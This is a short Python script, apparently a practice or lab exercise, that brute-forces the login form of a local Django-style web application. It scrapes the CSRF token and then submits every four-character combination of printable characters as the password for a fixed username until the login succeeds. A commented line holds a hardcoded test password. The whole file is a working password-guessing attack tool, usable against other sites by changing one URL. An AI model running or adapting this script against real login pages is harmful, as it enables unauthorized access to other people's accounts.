import requests
from bs4 import BeautifulSoup


def extract_csrf_token(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    return csrf_token


def brute_force_login(username, printable):
    for i1 in printable:
        for i2 in printable:
            for i3 in printable:
                for i4 in printable:
                    password = i1 + i2 + i3 + i4

                    payload = {"username": username, "password": password, "csrfmiddlewaretoken": csrf_token}
                    # if i4 == "8": #
                    #     payload = {"username": username, "password": "ZXCV!@#$", "csrfmiddlewaretoken": csrf_token}

                    response = requests.post("http://127.0.0.1:8000/accounts/login/", data=payload, cookies=cookies)

                    if response.text.count("Please enter a correct username and password") >= 1:
                        print(f"Password {password} is incorrect")
                    else:
                        print(f"Password {password} is correct")
                        return


printable = r"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!'#$%&'()*+,-./:;<=>?@[\]^_`{|}~" + r'"'
login_page = requests.get("http://127.0.0.1:8000/accounts/login/")
csrf_token = extract_csrf_token(login_page.content)
cookies = login_page.cookies

brute_force_login("Heyman", printable)
